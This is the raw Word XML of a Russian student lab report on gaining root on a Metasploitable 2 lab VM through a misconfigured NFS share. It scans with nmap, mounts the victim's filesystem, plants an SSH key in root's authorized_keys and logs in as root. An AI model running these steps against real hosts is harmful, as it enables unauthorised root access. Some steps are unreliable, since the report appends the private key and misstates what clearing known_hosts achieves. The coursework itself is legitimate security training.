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b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Лабораторная работа №</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">4. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">Использование уязвимости неправильно сконфигурированной </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve">NFS Share. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Форензика</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t>.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jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="0" w:date="2022-06-01T23:20:55Z" w:author="Артем Кондратьев">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
            <w:b w:val="1"/>
            <w:bCs w:val="1"/>
            <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
            <w:rtl w:val="0"/>
            <w:lang w:val="ru-RU"/>
          </w:rPr>
          <w:delText xml:space="preserve">Болатов Диас и Загирова Айдар </w:delText>
        </w:r>
      </w:del>
      <w:del w:id="1" w:date="2022-06-01T23:20:55Z" w:author="Артем Кондратьев">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
            <w:b w:val="1"/>
            <w:bCs w:val="1"/>
            <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
            <w:rtl w:val="0"/>
          </w:rPr>
          <w:delText>11-911</w:delText>
        </w:r>
      </w:del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Кондратьев Артём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11-901</w:t>
      </w:r>
    </w:p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1)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Создание виртуальной машины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Kali Linux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2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были выполнены в рамках предыдущих лабораторных работ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2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Kali Linux 2021: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4940" cy="2697010"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1073741825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7.png" descr="image17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940" cy="2697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Metasploitable 2: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1084" cy="2675035"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1073741826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3.png" descr="image3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084" cy="2675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2)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Настройка сети между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Kali Linux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и проверка соединения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Узнаем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67138" cy="2651729"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1073741827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2.png" descr="image2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651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Узнаем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Kali Linux,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0065" cy="2069018"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1073741828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1.png" descr="image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65" cy="2069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проверку корректности соединения с помощью команды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>ping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62388" cy="1430753"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1073741829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2.png" descr="image1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43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90963" cy="697872"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1073741830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24.png" descr="image2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697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</w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Основной текст"/>
        <w:ind w:left="720" w:firstLine="0"/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3)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Проверка портов через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de-DE"/>
        </w:rPr>
        <w:t>NMAP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Основной текст"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="8"/>
        </w:numPr>
        <w:spacing w:before="240" w:after="240"/>
        <w:rPr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Сканирование портов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 помощью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 xml:space="preserve">NMAP.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Выполним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nmap -p 1-65535 -T4 -A -v </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t>192.168.50.121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</w:rPr>
        <w:t xml:space="preserve">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2&gt;&amp;1 | tee /var/tmp/scan.txt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784481" cy="1852613"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1073741831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9.png" descr="image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481" cy="1852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86188" cy="3160049"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="107374183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160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2453" cy="1354448"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1073741833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8.png" descr="image1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53" cy="1354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00475" cy="1357313"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1073741834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5.png" descr="image15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57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 т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Конечный вывод работы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>NMAP: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43338" cy="1244935"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1073741835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3.png" descr="image13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244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8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Теперь нужно убедиться в том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distcc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запущен на порту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3632,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для этого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grep 3632 /var/tmp/scan.txt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71913" cy="565994"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1073741836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4.png" descr="image4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56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Убедимся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файл </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t xml:space="preserve">scan.txt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сохранился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этого перейдем в раздел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cd /var/tmp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 откроем файл через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cat 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97258" cy="2821857"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1073741837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1.png" descr="image1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58" cy="2821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Определим порт </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t>(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порты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),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которые используют сервисы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rpcinfo, nfs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ssh,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 их статус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выполнив анализ файла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подготовленного на предыдущем шаге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 помощью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egrep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i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‘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(rpcinfo|nfs|ssh)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’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pt-PT"/>
        </w:rPr>
        <w:t>/var/tmp/scan.txt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:shd w:val="clear" w:color="auto" w:fill="ffffff"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t>.1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033838" cy="2492931"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1073741838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26.png" descr="image26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492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4)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Оценка работы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en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">NFS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сервера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Использование неправильно сконфигурированной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en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">NFS Mount. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">Создание пары ключей </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t>SSH</w:t>
      </w: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>Выполним команду</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto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rtl w:val="0"/>
          <w:lang w:val="es-ES_tradnl"/>
        </w:rPr>
        <w:t xml:space="preserve">rpcinfo </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:i w:val="1"/>
          <w:iCs w:val="1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rtl w:val="0"/>
        </w:rPr>
        <w:t>p 192.168.50.121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2967039" cy="3776939"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1073741839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20.png" descr="image2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39" cy="3776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>Для удобства выполним команду</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto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rtl w:val="0"/>
          <w:lang w:val="es-ES_tradnl"/>
        </w:rPr>
        <w:t xml:space="preserve">rpcinfo </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:i w:val="1"/>
          <w:iCs w:val="1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rtl w:val="0"/>
        </w:rPr>
        <w:t>p 192.168.50.121 | grep nfs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3945290" cy="1783620"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1073741840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23.png" descr="image23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90" cy="1783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showmount -e 192.168.50.121</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> можно запросить вывод состояния </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">NFS </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>сервиса на машине жертвы</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t>: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005263" cy="851618"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1073741841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27.png" descr="image2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8516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Создадим каталог </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="nl-NL"/>
        </w:rPr>
        <w:t>/root/.ssh</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> командой </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="nl-NL"/>
        </w:rPr>
        <w:t>mkdir -p /root/.ssh</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> и перейдите в эту директорию</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t>: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Перед созданием </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">ssh </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">ключей можно так же выполнить команду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cat /dev/null &gt; knows_hosts</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> для предотвращения потенциальной атаки </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">man-in-the-middle. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Это не является необходимым для выполнения работы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004470" cy="2328414"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1073741842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9.png" descr="image19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470" cy="2328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Выполним команду </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t>ssh-keygen -t rsa -b 4096</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> для создания ключей</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Введем имя файла в котором будет храниться пара</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Введем и повторим секретную фразу для формирования ключей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3908072" cy="2826287"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1073741843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25.png" descr="image2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072" cy="2826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Убедимся в создании ключей командой </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="pt-PT"/>
        </w:rPr>
        <w:t>ls.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3910013" cy="843154"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1073741844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6.png" descr="image16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843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  <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">5) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">Монтирование файловой системы </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:b w:val="1"/>
          <w:bCs w:val="1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rtl w:val="0"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">Изменение файла </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">authorized_keys </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>машины</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>жертвы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Перейдем в корневой каталог командой </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t>cd /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>Примонтируем файловую систему машины</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">жертвы 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mount -t nfs 192.168.50.121:/ /mnt -o nolock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Убедимся в успешности монтирования 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 xml:space="preserve">df </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:i w:val="1"/>
          <w:iCs w:val="1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rtl w:val="0"/>
        </w:rPr>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:drawing xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="3971052" cy="2049872"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1073741845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6.png" descr="image6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052" cy="2049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0"/>
          <w:iCs w:val="0"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Перейдем в каталог</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="nl-NL"/>
        </w:rPr>
        <w:t xml:space="preserve"> /mnt/root/.ssh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0"/>
          <w:iCs w:val="0"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Скопируем публичный ключ командой</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> cp /</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:i w:val="0"/>
          <w:iCs w:val="0"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>root/.ssh/test_key.pub /mnt/root/.ssh/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Убедимся в его наличие командой </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="es-ES_tradnl"/>
        </w:rPr>
        <w:t>ls -l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199226" cy="1812196"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1073741846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7.png" descr="image7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26" cy="1812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Просмотрим текущее содержимое файла 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cat authorized_keys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Скопируем публичный ключ в </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">authorized_keys </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto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cat test_key &gt;&gt; authorized_keys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0"/>
          <w:iCs w:val="0"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">Посмотрим измененный файл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cat authorized_keys</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
        <w:drawing xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="4339371" cy="1578609"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1073741847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1.png" descr="image21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371" cy="1578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i w:val="1"/>
          <w:iCs w:val="1"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">5) 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  <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">Получение 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  <w:lang w:val="nl-NL"/>
        </w:rPr>
        <w:t xml:space="preserve">root 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  <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>прав</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">. 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  <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Форензика</w:t>
      </w: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Перейдем в каталог </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:i w:val="1"/>
          <w:iCs w:val="1"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="nl-NL"/>
        </w:rPr>
        <w:t>/root/.ssh/</w:t>
      </w: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Подключаемся по </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">ssh </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">к машине жертвы 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>ssh -i /root/.ssh/test_key root@192.168.50.121</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>подтвердив диалоговом окне подключение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310584" cy="2378611"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1073741848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4.png" descr="image14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584" cy="2378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Просмотрим список подключенных машин к серверу </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">NFS </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto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i w:val="1"/>
          <w:iCs w:val="1"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">showmount </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:i w:val="1"/>
          <w:iCs w:val="1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rtl w:val="0"/>
        </w:rPr>
        <w:t>a 192.168.50.121</w:t>
      </w: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>Размонтируем файловую систему машины</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>жертвы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405313" cy="1281375"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="107374184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.png" descr="image2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28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Убедимся в её отсутствии командой </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">df </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>–</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Roboto" w:cs="Roboto" w:hAnsi="Roboto" w:eastAsia="Roboto"/>
          <w:rtl w:val="0"/>
        </w:rPr>
